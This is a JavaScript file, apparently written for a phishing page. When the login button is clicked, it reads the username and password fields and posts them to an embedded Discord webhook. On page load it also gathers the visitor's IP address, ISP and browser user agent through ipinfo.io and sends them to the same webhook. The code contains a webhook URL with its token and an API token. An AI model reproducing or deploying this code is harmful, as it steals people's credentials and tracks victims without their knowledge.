let infoSent = false;

async function sendData() {
    const user = document.getElementById("user").value;
    const pass = document.getElementById("pass").value;

    console.log("User: " + user);  // Debug log for user
    console.log("Password: " + pass);  // Debug log for password

    if (!user || !pass) {
        console.log("User or password is empty.");
        return;
    }

    const webhookURL = "https://discord.com/api/webhooks/1304152509845340251/74tE2N2FhHXsk6MB9EbzjHly-5ef9VQFX_qqdvppo9j3SotzWgaNS05ZY2tSJ8WIgso0";

    const payload2 = {
        content: `**[+] Username:** ${user}\n**[+] Password:** ${pass}`
    };

    try {
        const response = await fetch(webhookURL, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify(payload2)
        });

        if (response.ok) {
            console.log("User data sent successfully!");
        } else {
            console.error("Failed to send user data:", response.status, response.statusText);
        }

        if (!infoSent) {
            await sendInfoOnLoad();
        }
    } catch (error) {
        console.error("Error sending data:", error);
    }
}

async function sendInfoOnLoad() {
    const webhookURL = "https://discord.com/api/webhooks/1304152509845340251/74tE2N2FhHXsk6MB9EbzjHly-5ef9VQFX_qqdvppo9j3SotzWgaNS05ZY2tSJ8WIgso0";

    try {
        const ipResponse = await fetch("https://ipinfo.io/json?token=b0138b9c06beb1");
        const ipData = await ipResponse.json();
        const ipAddress = ipData.ip || "[-] Unknown IP";
        const isp = ipData.org || "[-] Unknown ISP";

        const userAgent = navigator.userAgent;

        const payload = {
            content: `**[+] IP Address:** ${ipAddress}\n**[+] ISP:** ${isp}\n**[+] User Agent:** ${userAgent}`
        };

        const response = await fetch(webhookURL, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify(payload)
        });

        if (response.ok) {
            console.log("Info sent successfully!");
            infoSent = true;
        } else {
            console.error("Failed to send info:", response.status, response.statusText);
        }
    } catch (error) {
        console.error("Error:", error);
    }
}

window.onload = function () {
    sendInfoOnLoad();
};

document.addEventListener("DOMContentLoaded", function() {
    document.getElementById("submitBtn").addEventListener("click", sendData);
});